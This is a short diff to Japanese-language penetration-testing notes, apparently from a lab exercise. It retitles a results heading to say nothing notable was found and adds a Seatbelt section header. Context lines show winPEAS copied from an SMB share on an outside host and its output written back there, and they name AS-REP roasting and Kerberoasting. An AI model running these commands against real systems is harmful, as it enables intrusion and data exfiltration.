@@ -42,7 +42,7 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 .\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
 ```
 
-### 実行結果抽出
+### 実行結果抽出 -> 特になし
 
 ```powershell
 
@@ -104,6 +104,15 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 - AS-REP roastable
 
 - Kerberoastable
+
+
+
+
+---
+
+# Seatbelt
+
+## 記録用結果（長文注意）
 
 
 
